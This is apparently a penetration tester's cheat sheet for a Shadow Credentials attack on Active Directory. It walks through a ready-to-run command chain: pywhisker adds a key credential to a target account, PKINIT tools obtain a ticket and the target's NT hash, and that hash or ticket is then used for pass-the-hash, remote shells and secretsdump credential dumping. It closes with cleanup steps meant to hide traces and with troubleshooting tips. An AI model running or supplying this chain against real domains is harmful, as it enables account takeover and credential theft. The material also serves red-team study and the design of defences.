If we control a principal (user/computer) with WriteProperty on msDS-KeyCredentialLink of the TARGET object (user or computer), we can compromise the target principal.

How to identify:
	Identify via BloodHound: AddKeyCredentialLink edge.

Requirements:
	WriteProperty on msDS-KeyCredentialLink of the TARGET object.
	ADCS must be present in the domain (PKINIT enabled at the KDC).

Attack Chain
```bash
# ============================================================
# Shadow Credentials Attack (msDS-KeyCredentialLink abuse)
# ============================================================

# Placeholders:
#   <DOMAIN>           e.g. zsm.local
#   <DC>               e.g. zph-svrdc01.zsm.local
#   <DC_IP>            e.g. 192.168.210.10
#   <CTRL_USER>        the principal you control (e.g. marcus)
#   <CTRL_PASS>        cleartext password (or use -hashes :NT for hash)
#   <TARGET>           victim SAM (user OR computer$, e.g. ZPH-SVRMGMT1$)
#   <TARGET_PRINCIPAL> '<DOMAIN>/<TARGET>'  e.g. zsm.local/ZPH-SVRMGMT1$


# ── Add a KeyCredential to the target ───────────────────────
pywhisker -d "<DOMAIN>" -u "<CTRL_USER>" -p '<CTRL_PASS>' --target "<TARGET>" --action "add" --dc-ip <DC_IP>
# Output gives:
#   PFX file path:  <pfx_file>.pfx
#   PFX password:   <pfx_pass>
#   DeviceID:       <device_id>   (save for cleanup later)


# ── Request a TGT via PKINIT using the cert ─────────────────
gettgtpkinit.py -cert-pfx <pfx_file>.pfx -pfx-pass '<pfx_pass>' -dc-ip <DC_IP> '<TARGET_PRINCIPAL>' target.ccache
# Tool prints "AS-REP encryption key" — copy for next step


# ── UnPAC-the-hash → recover target's NT hash ───────────────
export KRB5CCNAME=$(pwd)/target.ccache
getnthash.py -key <as_rep_key> '<TARGET_PRINCIPAL>'
# Output: NT hash for target → use for PTH everywhere


# ── Use the compromised principal ───────────────────────────
# PTH with NT hash
nxc smb <TARGET_HOST_FQDN> -u '<TARGET>' -H <nt_hash> -d <DOMAIN>
evil-winrm -i <TARGET_HOST_FQDN> -u '<TARGET>' -H <nt_hash>

# Or use the TGT directly via Kerberos
export KRB5CCNAME=$(pwd)/target.ccache
psexec.py -k -no-pass <TARGET_HOST_FQDN>
wmiexec.py -k -no-pass <TARGET_HOST_FQDN>
secretsdump.py -k -no-pass <TARGET_HOST_FQDN>
	# If we can't authenticate, we can perhaps still use the machine account, like delegation.

# ── Cleanup — remove the KeyCredential (OpSec) ──────────────
pywhisker -d "<DOMAIN>" -u "<CTRL_USER>" -p '<CTRL_PASS>' --target "<TARGET>" --action "remove" --device-id <device_id> --dc-ip <DC_IP>


# ============================================================
# Troubleshooting
# ============================================================
# KDC_ERR_PADATA_TYPE_NOSUPP  → PKINIT disabled (no ADCS) — attack won't work
# INSUFF_ACCESS_RIGHTS        → CTRL_USER lacks WriteProperty (verify w/ bloodyAD)
# KDC_ERR_CLIENT_NOT_FOUND    → wrong target principal format (user vs computer$)
# Clock skew                  → sudo ntpdate -u <DC_IP>
# Wrong realm in errors       → ensure DC_IP, hostname, and realm casing align
```